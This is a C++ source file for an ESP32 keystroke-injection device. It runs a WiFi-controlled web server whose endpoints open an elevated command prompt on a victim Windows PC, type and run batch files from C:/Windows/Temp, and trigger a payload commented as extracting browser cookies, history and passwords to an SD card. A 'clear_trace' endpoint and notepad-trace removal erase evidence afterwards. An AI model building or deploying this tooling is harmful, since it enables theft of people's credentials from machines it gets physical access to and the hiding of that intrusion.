#include "wifi_server.h"

// Change the ssid and password to desired value
const char *ssid = "WifiExe";
const char *password = "password";

WebServer server(80); // Use port 80
String fileContent;   // Store content of files
bool check_delay = false;

// Encode string for use in URL parameters
String urlEncode(const String &input)
{
    String encoded = "";
    char bufHex[4];
    char c;

    for (size_t i = 0; i < input.length(); i++)
    {
        c = input.charAt(i);
        if (isalnum(c))
        {
            encoded += c;
        }
        else
        {
            sprintf(bufHex, "%%%02X", c);
            encoded += bufHex;
        }
    }
    return encoded;
}

// Decode URL-encoded string back to originl format
String urlDecode(const String &input)
{
    String decoded = "";
    char c;
    int i, j;
    for (i = 0; i < input.length(); i++)
    {
        if (input.charAt(i) == '%')
        {
            sscanf(input.substring(i + 1, i + 3).c_str(), "%x", &j);
            c = static_cast<char>(j);
            decoded += c;
            i += 2;
        }
        else if (input.charAt(i) == '+')
        {
            decoded += ' ';
        }
        else
        {
            decoded += input.charAt(i);
        }
    }
    return decoded;
}

// Encode special characters in HTML to prevent parsing errors
String htmlEscape(const String &input)
{
    String escaped = input;
    escaped.replace("&", "&amp;");
    escaped.replace("<", "&lt;");
    escaped.replace(">", "&gt;");
    escaped.replace("\"", "&quot;");
    escaped.replace("'", "&#39;");
    return escaped;
}

// Handle Folder Requests
// Disply Contents with links for navigation
void handleFolderRequest(const String &folderPath)
{
    String decodedFolderPath = urlDecode(folderPath);
    String folderStructure;
    File folder = SD.open(decodedFolderPath);
    if (!folder || !folder.isDirectory()) // If not found, return 404 error
    {
        server.send(404, "text/plain", "Folder not found");
        return;
    }

    // Iterate through each file and subfolers
    while (File entry = folder.openNextFile())
    {
        if (entry.isDirectory())
        {
            String subfolderPath = decodedFolderPath + "/" + entry.name();
            folderStructure += "<a href=\"/folder?path=" + urlEncode(subfolderPath) + "\">";
            folderStructure += htmlEscape(entry.name());
            folderStructure += "/</a><br>";
        }
        else
        {
            // If a file, create link to it's contents
            String filePath = decodedFolderPath + "/" + entry.name();
            folderStructure += "<a href=\"/file?path=" + urlEncode(filePath) + "\">";
            folderStructure += htmlEscape(entry.name());
            folderStructure += "</a><br>";
        }
        entry.close();
    }
    folder.close();

    // Send response
    char buffer[4096];
    snprintf(buffer, sizeof(buffer), folderViewHTML, cssStyles, folderStructure.c_str());
    server.send(200, "text/html", buffer);
}

// Display File Contents
void handleFileRequest(const String &filePath)
{
    String decodedFilePath = urlDecode(filePath);
    File file = SD.open(decodedFilePath);
    if (!file || file.isDirectory()) // If not found, return 404 error
    {
        server.send(404, "text/plain", "File not found");
        return;
    }

    fileContent = "";

    // Store contents
    while (file.available())
    {
        fileContent += (char)file.read();
    }
    file.close();

    String escapedContent = htmlEscape(fileContent);

    // Send response
    char buffer[4096];
    snprintf(buffer, sizeof(buffer), fileViewHTML, cssStyles, escapedContent.c_str());
    server.send(200, "text/html", buffer);
}

// Start writing file content
// Needs optimization, may not work as intended
void handleExecuteFileRequest()
{
    open_elevated_cmd();
    write("CD /d C:/Windows/Temp", 10, 1);
    write("mkdir temp", 10, 1);
    write("cd temp", 10, 1);
    write("rem/ > temp.bat", 10, 1);
    write("notepad temp.bat", 10, 1);
    Keyboard.releaseAll();
    delay(2000);
    write_task(fileContent.c_str(), 20, 0);
    delay(1000);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.write('s'); // save the file
    Keyboard.release('s');
    Keyboard.press('w'); // remove notepad traces
    Keyboard.releaseAll();
    delay(500);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.write(KEY_RETURN);
    delay(1000);
    write("cls", 10, 1);
    write("temp.bat", 5, 1);
}

// Restart ESP32
void handleRestartRequest()
{
    Keyboard.end();
    eject_storage();
}

void handleMountStorage()
{
    Keyboard.end();
    // Kill SDcard storage initiated by wifi_server.cpp
    if (SD.begin(10))
    {
        SD.end();
    }
    // Kill leftover connections, If any
    SPI.end();
    delay(100);
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
    // Initialize SDcard storage at /sd & Start MSC
    mount_storage();
}

// Extract browser cookies, history and passwords
// Save the data to /sd/results/
void handlePayloadRequest()
{
    char buffer[4096];
    snprintf(buffer, sizeof(buffer), redirectToRoot, cssStyles);
    // Go back to home page after completion of extraction
    server.send(200, "text/html", buffer);
    delay(4000);
    payload();
    check_delay = true;
    delay(1000);
    write("cls", 10, 1);
    write("execute.bat", 5, 1);
    delay(3000);
    handleMountStorage();
}

void handleClearTraceRequest()
{
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
    open_elevated_cmd();
    clear_trace();
}

// Handle root directory request
void handleRootRequest()
{
    char buffer[4096];
    snprintf(buffer, sizeof(buffer), rootViewHTML, cssStyles);
    server.send(200, "text/html", buffer);
}

// Start wifiAP and web server at 192.168.4.1
void setupWiFiServer()
{
    WiFi.softAP(ssid, password);
    delay(100);

    SD.begin(10);

    server.on("/", handleRootRequest);
    server.on("/folder", []()
              {
        String path = server.arg("path");
        handleFolderRequest(path); });
    server.on("/file", []()
              {
        String path = server.arg("path");
        handleFileRequest(path); });
    server.on("/execute_function", HTTP_POST, handleExecuteFileRequest);
    server.on("/payload", handlePayloadRequest);
    server.on("/restart", handleRestartRequest);
    server.on("/mount_sd", handleMountStorage);
    server.on("/clear_trace", handleClearTraceRequest);
    server.onNotFound([]()
                      { server.send(404, "text/plain", "Not found"); });

    server.begin();
}
